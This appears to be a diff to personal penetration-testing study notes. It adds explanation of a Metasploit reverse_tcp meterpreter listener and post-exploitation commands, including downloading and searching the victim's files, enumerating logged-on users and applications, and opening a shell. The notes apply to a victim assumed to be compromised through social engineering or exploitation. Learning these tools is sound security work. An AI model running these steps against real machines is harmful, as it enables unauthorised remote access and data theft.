@@ -813,13 +813,17 @@ Things to take into account when desiging a payload
 
 **Metsaploit code to listen for retrograde connection from the Victim**
 
+Asuming that the payload is already downloaded in the victim machine either via social engineering or via exploitation of services or OS vulnerabilities and establishing a meterpreter session
+
 - `msfconsole`
 - `set payload windows/meterpreter/reverse_tcp` 
 - `show options`
 - `set LHOST <hacker's ip address>` this ip address must be the same as mentioned in the payload
 - `set LPORT 4444`
 - `show options`
-- `exploit` 
+- `exploit` - This will start listening for the victim's machine which is told to connect to the hacker using reverse shell
+
+Once a connection is established, the the terminal will now say `meterpreter`
 
 
 **Meterpreter**
@@ -866,12 +870,20 @@ Once we've connected to a Meterpreter session, we can run many other commands to
 
   - `download`: Downloads a file from the target.
 
-  - `search`: Searches for resources, similar to the `find` command in Linux.
+  - `search`: Searches for resources, similar to the `find` command in Linux. e-g `search -f *.jpg`
 
   - `run win_privs`: Provides more detailed Windows privilege information.
 
   - `run win_enum`: Runs a comprehensive suite of Windows enumerations and stores the results on the attacking machine.
 
+- We can also run further exploitation code with meterpreter with builtin meterpreter modules. A few examples are below:
+
+- `run post/windows/gather/`
+- `run post/windows/gather/enum_applications`
+- `run post/windows/gather/enum_logged_on_users`
+- `shell`
+
+I asume that the above are run from hackers machine via the meterpreter session, but not so sure
 
 
 **Payload types**
